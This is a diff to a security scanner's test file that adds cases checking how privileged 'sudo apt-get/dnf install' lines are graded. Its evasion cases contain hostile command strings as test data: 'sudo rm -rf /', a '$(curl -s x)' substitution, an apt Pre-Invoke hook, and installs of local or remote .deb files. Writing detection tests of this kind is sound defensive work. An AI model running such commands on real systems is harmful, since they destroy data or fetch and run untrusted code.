@@ -930,6 +930,62 @@ def _temper_fsw004_cases() -> None:
 _temper_fsw004_cases()
 
 
+# PRV-001: `sudo <apt|apt-get|dnf|yum> update|install` whose every flag is
+# allowlisted and every other operand is a literal package name -> MEDIUM. The
+# subcommand must sit immediately after the manager name — a flag ahead of it
+# is out of the shape entirely, not merely off the allowlist, and stays HIGH
+# either way.
+
+def _temper_prv001_cases() -> None:
+    from scanner import engine
+
+    TEMPERED_CASES = [
+        ("PRV-001", "a bare update tempers",
+         "sudo apt-get update", "MEDIUM"),
+        ("PRV-001", "install with -y and several literal packages tempers",
+         "sudo apt-get install -y imagemagick librsvg2-bin poppler-utils", "MEDIUM"),
+        ("PRV-001", "dnf tempers the same way",
+         "sudo dnf install -y jq", "MEDIUM"),
+        ("PRV-001", "a second allowed flag still tempers",
+         "sudo apt-get install -y --no-install-recommends imagemagick", "MEDIUM"),
+
+        # -- evasions --
+        ("PRV-001", "a local .deb operand keeps HIGH",
+         "sudo apt-get install ./evil.deb", None),
+        ("PRV-001", "a URL operand keeps HIGH",
+         "sudo apt-get install https://x.example/p.deb", None),
+        ("PRV-001", "a flag ahead of the subcommand keeps HIGH",
+         "sudo apt-get -o APT::Update::Pre-Invoke::=id update", None),
+        ("PRV-001", "a command substitution operand keeps HIGH",
+         "sudo apt-get install $(curl -s x)", None),
+        ("PRV-001", "an unlisted package manager keeps HIGH",
+         "sudo pip install foo", None),
+        ("PRV-001", "a chained unrelated sudo command keeps the WHOLE LINE HIGH",
+         "sudo apt-get update && sudo bash x.sh", None),
+        ("PRV-001", "a chained sudo rm keeps the WHOLE LINE HIGH",
+         "sudo apt-get update; sudo rm -rf /", None),
+        ("PRV-001", "an env-var prefix on the same segment keeps HIGH",
+         "SOMEVAR=1 sudo apt-get update", None),
+        ("PRV-001", "sudo rm of the cache path is not an apt subcommand, keeps HIGH",
+         "sudo rm -rf /var/lib/apt/lists/*", None),
+    ]
+
+    for rule_id, name, line, want in TEMPERED_CASES:
+        rule = _rule(rule_id)
+        result = engine._tempered_severity(rule, line)
+        got = result[0] if result else None
+        check(f"tempered/{rule_id}", name, got, want,
+              "install-line-severity: tempering needs a fullmatch of the whole "
+              "segment, and every segment where the rule fires on the line")
+
+    check("tempered/PRV-001", "the rule's own severity field stays HIGH",
+          _rule("PRV-001").severity, "HIGH",
+          "severity is set by the rule; tempering is a per-line REPORT decision")
+
+
+_temper_prv001_cases()
+
+
 # ------------------------------------------------------------------- taint helpers
 # _is_shell decides which reference syntax is used AND whether the
 # literal_demotion probe runs at all, so getting it wrong silently changes how a
